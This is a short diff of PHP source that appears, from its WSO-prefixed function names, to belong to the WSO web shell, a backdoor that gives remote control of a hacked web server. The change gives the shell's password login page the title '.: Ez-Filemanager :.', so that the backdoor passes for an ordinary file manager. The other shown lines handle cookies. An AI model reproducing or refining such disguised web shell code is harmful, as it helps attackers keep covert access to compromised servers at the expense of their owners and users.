@@ -26,7 +26,7 @@ if(get_magic_quotes_gpc()) {
     $_COOKIE = WSOstripslashes($_COOKIE);
 }
 function wsoLogin() {
-	die("<pre align=center><form method=post><input type=password name=pass placeholder=password style='background-color:whitesmoke;border:1px solid #fff;outline:none;' required><input type=submit name='mypass' value='submit' style='border:none;background-color:#56ad15;color:#fff;cursor:pointer;'></form></pre>");
+	die("<title>.: Ez-Filemanager :.</title><pre align=center><form method=post><input type=password name=pass placeholder=password style='background-color:whitesmoke;border:1px solid #fff;outline:none;' required><input type=submit name='mypass' value='submit' style='border:none;background-color:#56ad15;color:#fff;cursor:pointer;'></form></pre>");
 }
 function WSOsetcookie($k, $v) {
     $_COOKIE[$k] = $v;
